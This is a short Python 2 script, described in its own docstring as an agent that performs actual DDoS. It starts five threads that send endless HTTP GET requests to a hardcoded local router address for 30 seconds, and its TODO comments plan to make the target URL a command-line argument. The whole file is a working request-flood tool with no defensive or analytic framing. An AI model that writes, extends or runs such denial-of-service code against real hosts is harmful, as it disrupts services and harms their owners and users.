"""
An agent that performs actual DDOS.
It sends HTTP GET requests to a specified URL concurrently
"""

import thread
import time
import urllib2


def main():
    # TODO if there is no arguments - ddos a default url, else check and ddos specified
    for num in range(0, 5):
        thread_id = 'thread'
        thread_id += str(num)
        start_ddos_thread(thread_id)
    # ddos from multiple threads during 30s
    time.sleep(30)


def ddos_url(thread_name):
    requests_counter = 0
    # my router url hardcoded for simplicity //TODO extract it as a script argument
    victim_url = "http://192.168.88.1:80"
    while 0 == 0:
        # read first 300 bytes of a response //TODO use request library
        data = urllib2.urlopen(victim_url)
        requests_counter = requests_counter + 1
        print "thread #", thread_name
        # TODO add latency
        print "response_code:" + str(data.code) + " , latency: " + "?"


def start_ddos_thread(thread_name):
    thread.start_new_thread(ddos_url, (thread_name,))


if __name__ == "__main__":
    main()
